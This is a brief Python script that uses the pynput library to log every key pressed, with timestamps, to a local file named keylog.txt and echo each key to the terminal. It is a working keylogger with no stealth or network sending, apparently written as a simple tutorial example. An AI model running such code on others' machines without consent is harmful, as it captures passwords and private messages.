from pynput import keyboard
import logging
import os

# 1. Set Log File Path
log_file = os.path.join(os.getcwd(), "keylog.txt")  # saves to current folder

# 2. Configure Logging
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

# 3. Function to Handle Key Presses
def on_press(key):
    try:
        print(f"Key pressed: {key.char}")  # terminal output
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        print(f"Special key pressed: {key}")  # e.g., Key.enter
        logging.info(f"Special key pressed: {key}")

# 4. Start Keyboard Listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()  # Keeps the program running
